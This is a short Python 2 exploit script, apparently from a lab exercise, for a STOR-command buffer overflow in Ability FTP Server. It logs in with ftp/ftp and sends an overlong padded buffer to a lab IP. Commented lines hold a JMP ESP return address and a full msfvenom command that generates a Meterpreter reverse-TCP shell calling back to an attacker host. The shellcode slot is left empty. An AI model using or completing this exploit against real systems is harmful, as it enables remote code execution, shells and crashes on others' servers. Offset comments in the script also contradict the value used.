#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
Ability FTP Server Exploit - Offset & JMP ESP
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
#shellcode = ()

#EIP = 69413269 -> offset at 247
offset = 'A'*966 

#JMP ESP = !mona jmp -r esp -> 0x7e429353 or \x53\93\x42\x7e
#nowjump = '\x53\x93\x42\x7e'
nowjump = 'B'*4

#bufferandshellcode
sploit = offset + nowjump + 'C'*(1000)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print "\nDestroy them with lazers..."
	s.connect(('172.16.73.129',21))
	s.recv(1024)
	s.send('USER ftp\r\n')
	s.recv(1024)
	s.send('PASS ftp\r\n')
	s.recv(1024)
	s.send('STOR ' + sploit + '\r\n\n')
	s.recv(1024)
	s.send('QUIT\r\n')
	s.close
	print "\nFire in the hole! Go pick up the pieces!"
except:
	print "ERROR! Shutting it dooooown.."
